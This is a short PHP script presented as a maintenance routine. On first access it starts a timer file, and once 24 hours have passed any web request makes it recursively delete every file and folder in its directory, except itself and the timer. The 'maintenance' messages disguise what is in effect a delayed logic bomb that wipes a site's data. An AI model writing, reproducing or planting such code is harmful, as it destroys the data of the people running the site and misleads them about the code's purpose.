<?php
$timerFile = __DIR__ . '/maintenance.dat';
if (!file_exists($timerFile)) {
    file_put_contents($timerFile, time());
    die('Maintenance timer started.');
}
$startTime = (int) file_get_contents($timerFile);
if ((time() - $startTime) < 86400) {
    die('Maintenance pending...');
}
function removeContents($dir)
{
    $items = scandir($dir);
    foreach ($items as $item) {
        if ($item === '.' || $item === '..') {
            continue;
        }
        $path = $dir . DIRECTORY_SEPARATOR . $item;
        if (
            basename($path) === 'maintenance.php' ||
            basename($path) === 'maintenance.dat'
        ) {
            continue;
        }

        if (is_dir($path)) {
            removeContents($path);
            @rmdir($path);
        } else {
            @unlink($path);
        }
    }
}

removeContents(__DIR__);
echo "Cleanup completed.";
?>